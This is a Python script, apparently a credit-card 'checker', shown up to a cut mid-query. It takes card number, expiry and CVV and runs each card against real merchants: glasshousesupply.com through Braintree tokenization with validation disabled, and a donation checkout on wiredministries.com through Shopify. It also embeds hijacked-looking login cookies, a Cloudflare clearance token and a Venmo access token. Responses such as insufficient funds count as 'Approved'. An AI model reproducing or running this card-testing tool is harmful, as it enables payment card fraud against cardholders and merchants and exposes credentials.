import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele4(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    last_used_times = {}
  while True:
    lines = '''nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d
gdjejiwiwjek%7C1743341127%7C1YjsGvn6ciJHeUwulQk7ITMqX9s4GMbiBZDOOe6IIuf%7Cf532b67016b00fa640a5037cc5864f8a9f06fbaecda90a6c66825a856e8e12b6
hsjwkwkwk%7C1743432631%7CjjrbTwmYQpHrpPA9xCS0W1R9u3zAjWvaCEOHDNYZop0%7C6fe611d432a6373c5545c1de2dbf35986d4cfb32a4cad6fb19a36cfb35c6edc8
hrhejjeje%7C1743432903%7CWP3mIEqeApMHdWsE5doFcVeMryFdIny6lFLhi9Caein%7C02782ff01f6a91284f59bbf1f5394d3dcca9ac6b49ecb8b7064f785af0033f3d
tweuuei3828%7C1743433060%7CHQn3CTSkQBVrzU4l5kSVVSksLFm7wFEAAtXHEBWeYNN%7Cc45469d75ff13269112a08e2b646fa4e8895877e07f4c7135ab8709ada7b30c2'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
    	time_since_last_use = current_time - last_used_times[big]
    	if time_since_last_use < 30:
    		continue    
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
    'sbjs_session': 'pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fpayment-methods%2F',
}

  headers = {
    'authority': 'glasshousesupply.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199=hioo999%7C1743161300%7CAwlhKxVRYsG0Zl1skBCBFpfks7UwtSyvb6KiULz0kFX%7C60d800ccdca52b49b821f8086216abed72d1a684a2a25346def3f902f6a1958e; wfwaf-authcookie-98378724241a3d95191bebf32899230c=100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; cf_clearance=CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fpayment-methods%2F',
    'referer': 'https://glasshousesupply.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  response = requests.get('https://glasshousesupply.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6c244cd1-8fc1-4764-872a-779df4d8a7ac',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'Near Walmart 45',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
}

  headers = {
    'authority': 'glasshousesupply.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://glasshousesupply.com',
    'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"d93c0f351e441c91b6b49ab9d2f2a871","fraud_merchant_id":null,"correlation_id":"1cd6de08-ac9f-4dac-9738-f846dca6"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/gsnpd3rfchdqjpkp/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/gsnpd3rfchdqjpkp"},"merchantId":"gsnpd3rfchdqjpkp","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Glass House Supply","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDIyMTM5NzIsImp0aSI6IjljMzNiNDAwLTc2MmMtNDczMC1hZGMzLTdhM2IzZmIzNDNjZCIsInN1YiI6ImdzbnBkM3JmY2hkcWpwa3AiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImdzbnBkM3JmY2hkcWpwa3AiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.IEjz_pe5iVfQyQxVm5maCb5-cxxVKE3FupqBPCHsz88-x9g2753sUNniEE4S0wPBIzca-qAOgCaJ48SjvOjN5g","paypalClientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4016730080957399375","accessToken":"access_token$production$gsnpd3rfchdqjpkp$28454b24bcf28cb102a779aa4289345a","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Glass House Supply","clientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"glasshousesupply_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

  response = requests.post(
    'https://glasshousesupply.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = 'wait for 20 seconds'
    else:
      result = "Declined"
      print('er#')
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
  else:
     return result
import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {'authority': 'wiredministries.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW','origin': 'https://wiredministries.com','referer': 'https://wiredministries.com/products/donate','sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1', 'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',}
	data = '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="add"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
	response = r.post('https://wiredministries.com/cart/add', cookies=r.cookies, headers=headers, data=data)
	headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://wiredministries.com', 'priority': 'u=0, i','referer': 'https://wiredministries.com/cart','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	data = {'updates[]': '2', 'note': '', 'checkout': 'Check out'}
	response = r.post('https://wiredministries.com/cart', headers=headers, data=data)
	headers = {'accept': 'application/json','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-type': 'application/json','origin': 'https://checkout.shopifycs.com','priority': 'u=1, i','referer': 'https://checkout.shopifycs.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	json_data = {'credit_card': {'number': n,'month': mm,'year': yy,'verification_value': cvc,'name': 'Tome Annder',},'payment_session_scope': 'wiredministries.com',}
	iddd = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data).json()['id']
	headers = {'accept': 'application/json','accept-language': 'en-US','content-type': 'application/json','origin': 'https://wiredministries.com','priority': 'u=1, i','referer': 'https://wiredministries.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','x-checkout-one-session-token': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09','x-checkout-web-build-id': iddd,'x-checkout-web-deploy-stage': 'production','x-checkout-web-server-handling': 'fast','x-checkout-web-server-rendering': 'no','x-checkout-web-source-id': 'Z2NwLWV1cm9wZS13ZXN0MTowMUo2NVlXVlhRQVI0QUtOWEM4VlBaTTJIWQ',}
	params = {'operationName': 'PollForReceipt',}
	
	json_data = {'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature 